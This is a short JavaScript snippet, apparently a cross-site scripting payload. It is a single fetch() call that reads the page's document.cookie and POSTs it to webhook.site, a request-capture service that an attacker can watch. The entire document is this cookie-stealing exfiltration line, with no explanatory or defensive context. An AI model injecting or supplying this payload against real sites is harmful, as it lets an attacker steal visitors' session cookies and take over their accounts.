fetch('https://webhook.site/', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'a='+document.cookie
})
